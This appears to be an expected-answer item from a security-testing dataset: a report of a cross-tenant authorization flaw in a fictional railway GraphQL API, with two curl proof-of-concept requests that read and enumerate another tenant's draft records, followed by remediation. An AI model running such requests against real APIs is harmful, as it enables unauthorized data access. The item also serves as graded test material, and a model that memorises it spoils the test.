# Expected Response

## System
- Domain: Railway / Rail Operations
- System: RailCore Operations API
- Example ID: GQL-0088

## Priority Findings

### Finding 1: Access to Draft/Non-Published Railway Operations Records (Pattern 10.5)
**Severity:** High
**Category:** BOLA / Single-User / Draft Resource Access

**Summary:**
Per §5.0 (Pattern 10.5 — draft/non-published resource access): The `getResource` resolver does not enforce tenantId, enabling access to railway operations records that may be in draft/unpublished state (not yet approved for operational use). An attacker from `tenant-c8a2` accessed railway operations record `R-2088` belonging to `tenant-3271`. In railway operations, access to unpublished timetables, maintenance windows, or signalling instructions before they are authorized for release creates safety risks and potential for disruption.

**Evidence from HAR:**
- Request: `POST https://api.railcore-operatio.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-c8a2`
- Query: `getResource(id: "R-2088") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-3271"`, `ownerId: "other-user-c8a23271"`, `sensitiveField: "CONFIDENTIAL-c8a23271"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-c8a23271`

## Steps to Reproduce

### Step 1 — Access draft railway operations record (HAR)
```bash
curl -s -X POST https://api.railcore-operatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c8a2" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2088\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-c8a23271` from `tenant-3271`. **Secure:** FORBIDDEN.

### Step 2 — Enumerate draft records via bulk lookup
```bash
curl -s -X POST https://api.railcore-operatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c8a2" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2088\", \"R-1088\", \"R-3088\"]) { resourceId tenantId status data { sensitiveField } } }"}'
```
**Vulnerable:** Draft records with `status=draft` returned cross-tenant.

## Remediation
1. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Additionally filter by `status != 'draft'` for cross-tenant scenarios — only serve published records.
3. Per-ID ownership filter in `bulkResourceLookup`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
